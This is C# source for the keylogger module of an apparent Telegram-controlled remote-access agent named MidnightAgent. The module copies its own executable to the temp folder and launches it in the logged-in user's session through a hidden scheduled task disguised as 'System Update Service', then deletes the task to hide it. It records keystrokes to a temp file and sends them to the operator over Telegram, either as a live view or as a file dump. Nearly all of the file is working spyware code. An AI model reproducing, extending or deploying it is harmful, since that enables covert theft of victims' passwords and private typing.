using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class KeyloggerFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "keylogger";
        public string Description => "Keylogger (start [live]/stop/dump)";
        public string Usage => "/keylogger start [live] | /keylogger stop | /keylogger dump";

        private const string WORKER_NAME = "MidnightKeylogger.exe";
        private const string TASK_NAME = "MidnightKeyloggerTask";
        private static readonly string LOG_FILE = Path.Combine(Path.GetTempPath(), "midnight_keylog.txt");

        // Live state
        private static CancellationTokenSource _liveCts;
        private static int _liveMessageId = 0;
        private static bool _isLive = false;
        private static readonly object _lock = new object();

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length < 1) return Task.FromResult(FeatureResult.Fail("Usage: /keylogger [start|stop|dump]"));

            string action = args[0].ToLower();
            bool isLiveRequest = args.Length > 1 && args[1].Equals("live", StringComparison.OrdinalIgnoreCase);

            try
            {
                if (action == "start")
                {
                    var result = StartKeylogger(isLiveRequest);
                    
                    if (isLiveRequest && result.Result.Success)
                    {
                        StartLiveUpdate();
                        return Task.FromResult(FeatureResult.Ok("🔍 <b>Keylogger started in LIVE mode.</b>"));
                    }
                    
                    return result;
                }
                else if (action == "stop")
                {
                    StopLiveUpdate();
                    return StopKeylogger();
                }
                else if (action == "dump")
                {
                    return DumpLogs();
                }
                else
                {
                    return Task.FromResult(FeatureResult.Fail("Invalid action. Use start, stop, or dump."));
                }
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }

        private void StartLiveUpdate()
        {
            lock (_lock)
            {
                if (_isLive) StopLiveUpdate();
                
                _isLive = true;
                _liveCts = new CancellationTokenSource();
                _liveMessageId = 0;
            }

            Task.Run(async () =>
            {
                long lastPos = 0;
                string currentBuffer = "";
                string lastBuffer = "";
                int lastMinute = -1;
                DateTime lastMessageUpdate = DateTime.MinValue;

                // Initial Send
                _liveMessageId = TelegramInstance?.SendMessageWithId("⌨️ <b>Live Keylogger Initializing...</b>") ?? 0;

                while (!_liveCts.Token.IsCancellationRequested)
                {
                    bool contentChanged = false;
                    try
                    {
                        if (File.Exists(LOG_FILE))
                        {
                            using (var fs = new FileStream(LOG_FILE, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                            {
                                if (fs.Length < lastPos) lastPos = 0; // File was cleared or rotated
                                
                                if (fs.Length > lastPos)
                                {
                                    fs.Seek(lastPos, SeekOrigin.Begin);
                                    using (var reader = new StreamReader(fs))
                                    {
                                        string newContent = await reader.ReadToEndAsync();
                                        lastPos = fs.Position;
                                        
                                        if (!string.IsNullOrEmpty(newContent))
                                        {
                                            currentBuffer += newContent;
                                            
                                            // Limit buffer for Telegram (4096 chars)
                                            if (currentBuffer.Length > 3000)
                                            {
                                                currentBuffer = currentBuffer.Substring(currentBuffer.Length - 3000);
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        var now = DateTime.Now;
                        int currentMinute = now.Minute;

                        // Check if we should update:
                        // 1. Content has changed (new keys)
                        // 2. Minute has changed (heartbeat/clock update)
                        if (currentBuffer != lastBuffer || currentMinute != lastMinute)
                        {
                            // Throttle updates to at most once per 2 seconds to avoid Rate Limit during fast typing
                            if (_liveMessageId > 0 && (now - lastMessageUpdate).TotalMilliseconds > 2000)
                            {
                                string displayBody = string.IsNullOrEmpty(currentBuffer) ? "<i>(Waiting for keys...)</i>" : System.Net.WebUtility.HtmlEncode(currentBuffer);
                                string text = $"⌨️ <b>Keylogger Live View [{now:HH:mm}]</b>\n" +
                                             $"──────────────────\n" +
                                             $"{displayBody}\n" +
                                             $"──────────────────\n" +
                                             $"<i>Use /keylogger stop to finish live view.</i>";

                                TelegramInstance?.EditMessage(_liveMessageId, text);
                                
                                lastBuffer = currentBuffer;
                                lastMinute = currentMinute;
                                lastMessageUpdate = now;
                            }
                        }
                    }
                    catch { }

                    await Task.Delay(1000);
                }
            });
        }

        private void StopLiveUpdate()
        {
            lock (_lock)
            {
                if (!_isLive) return;
                _isLive = false;
                _liveCts?.Cancel();
                
                if (_liveMessageId > 0)
                {
                    TelegramInstance?.EditMessage(_liveMessageId, "🛑 <b>Live Keylogger session ended.</b>");
                    _liveMessageId = 0;
                }
            }
        }

        private Task<FeatureResult> StartKeylogger(bool isLive = false)
        {
            // check if already running
            if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(WORKER_NAME)).Length > 0)
            {
                return Task.FromResult(FeatureResult.Ok("⚠️ Keylogger is already running."));
            }

            // Copy our executable to temp with new name
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            string targetExe = Path.Combine(Path.GetTempPath(), WORKER_NAME);

            try
            {
                File.Copy(currentExe, targetExe, true);
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Failed to copy agent executable: {ex.Message}"));
            }

            // Arguments for worker
            string arguments = $"--keylogger-worker \"{LOG_FILE}\"";

            // Run using Task Scheduler (SYSTEM -> User)
            if (RunAsUser(targetExe, arguments))
            {
                return Task.FromResult(FeatureResult.Ok($"✅ Keylogger started successfully.\nProcess: {WORKER_NAME}\nLog File: {LOG_FILE}"));
            }
            else
            {
                return Task.FromResult(FeatureResult.Fail("Failed to start keylogger task (could not find active user or schedule task)."));
            }
        }

        private Task<FeatureResult> StopKeylogger()
        {
            int killCount = 0;
            try
            {
                foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(WORKER_NAME)))
                {
                    proc.Kill();
                    killCount++;
                }

                if (killCount > 0)
                    return Task.FromResult(FeatureResult.Ok($"✅ Keylogger stopped. ({killCount} processes killed)"));
                else
                    return Task.FromResult(FeatureResult.Fail("Keylogger is not running."));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error stopping keylogger: {ex.Message}"));
            }
        }

        private Task<FeatureResult> DumpLogs()
        {
            if (File.Exists(LOG_FILE))
            {
                // We return path, and let main loop upload/display it
                // Or we can just read text if it's small. Let's send as file for safety.
                return Task.FromResult(FeatureResult.File(LOG_FILE, "⌨️ Keylogger Dump"));
            }
            else
            {
                return Task.FromResult(FeatureResult.Fail("No log file found."));
            }
        }

        private bool RunAsUser(string exePath, string args)
        {
            try
            {
                string loggedInUser = GetLoggedInUser();
                if (string.IsNullOrEmpty(loggedInUser)) return false;

                string xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo><Description>System Update Service</Description></RegistrationInfo>
  <Triggers><TimeTrigger><StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <!-- No limit -->
  </Settings>
  <Actions>
    <Exec>
      <Command>""{exePath}""</Command>
      <Arguments>{args}</Arguments>
    </Exec>
  </Actions>
</Task>";
                File.WriteAllText(xmlPath, taskXml);

                RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{TASK_NAME}\" /F");
                RunSchtasks($"/Run /TN \"{TASK_NAME}\"");
                
                // Cleanup XML and Task later
                Task.Delay(5000).ContinueWith(_ => {
                     try { File.Delete(xmlPath); } catch { }
                     try { RunSchtasks($"/Delete /TN \"{TASK_NAME}\" /F"); } catch { }
                });

                return true;
            }
            catch { return false; }
        }

        private string GetLoggedInUser()
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
                    {
                        foreach (System.Management.ManagementObject obj in searcher.Get())
                        {
                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                            {
                                string domain = ownerInfo[1];
                                string user = ownerInfo[0];
                                return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private void RunSchtasks(string arguments)
        {
            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit(5000);
            }
        }
    }
}
